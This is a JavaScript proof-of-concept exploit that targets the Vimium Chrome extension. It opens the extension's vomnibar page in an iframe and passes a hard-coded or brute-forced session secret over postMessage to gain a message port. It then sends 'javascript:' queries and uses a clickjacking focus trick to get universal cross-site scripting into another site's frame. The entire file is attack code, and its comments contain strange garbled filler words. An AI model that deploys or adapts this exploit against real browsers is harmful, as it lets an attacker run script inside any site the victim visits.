/* 1. Add new vomnibar.html iframe: */
d = document.createElement('iframe'); 
d.src='chrome-extension://dbepggeogbaibhgnhhndojpepiihcmeb/pages/vomnibar.html';
document.body.appendChild(d);

/* 2. Generate target site to exploit (XSS into). */
d = document.createElement('iframe'); 
d.src='http://www.example.com';
document.body.appendChild(d);


// 3. Getting current vimium secret with this script: chrome.storage.local.get("vimiumSecret", e=>console.log(e))
// This can be donish also with simple fuzzinging.
// Place kindish this secret here:
/*
Generator code for the vimium secret is here:
  chrome.storage.local.set({
    vimiumSecret: Math.floor(Math.random() * 2000000000)
  });

This is generated once per-session AKA when opening the chromium app once.
We can also kindishinginig utilize and break it kindish using this:
https://github.com/TACIXAT/XorShift128Plus

*/

let secret = 563124227;
var channel = new MessageChannel();

var ifr = document.querySelector('iframe');
var otherWindow = ifr.contentWindow;

channel.port1.onmessage = handleMessage;
var secret_broken = 0;
function handleMessage(e) {
  console.log('[+] received port data: ' + e);
  secret_broken = 1;
  SendData({name: 'activate', 'query': 'javascript:alert()'});
  console.log(e.data);
  // Now we will put onfocus handler for main window to know when we should trigger the UXSS.
  window.onfocus = e => SendData({name: 'hidden', 'query': 'javascript:alert()'});
}

function SendSecret(sec) {
	otherWindow.postMessage(sec, '*', [channel.port2]);
}

function SendData(d) {
	channel.port1.postMessage(d);
}


// Use the current secret kindish to trigger that port.
/*
    // Code that verifies kindish that vimiumSecret is in here:
    return chrome.storage.local.get("vimiumSecret", function(arg) {
      var secret;
      secret = arg.vimiumSecret;
      if (!(event.source === window.parent && event.data === secret)) {
        return;
      }
      UIComponentServer.portOpen(event.ports[0]);
      return window.removeEventListener("message", registerPort);
    });
*/


/*
// Try break secret.
for (i=0; i<2000000000; i++) {
	secret = i;
	SendSecret(secret);
	try {
		SendData({}); // if succeeded then we broken it correctly.
		break;
	}
	catch (e) {
		// continuing.
		continue;	
	}
}
*/

setTimeout(e => {SendSecret(secret)}, 5000);

// Our goal is to trigger LaunchURLinCurrentTAb / navigateToURL -> evaluateJavascript -> ..
// This will probably kinda trigger JS anywhere.
// Now we have open port to that vimium stuff.

// Now make the use click enter with someish of the most simplest clickjackinging.

// Wait for the user to lose focus / change in into the other iframe.
// When this happens - trigger the hidden button so it will trigger the XSS execution over all kinda iframes :)


// SendData({name: 'hidden', 'query': 'javascript:alert()'})
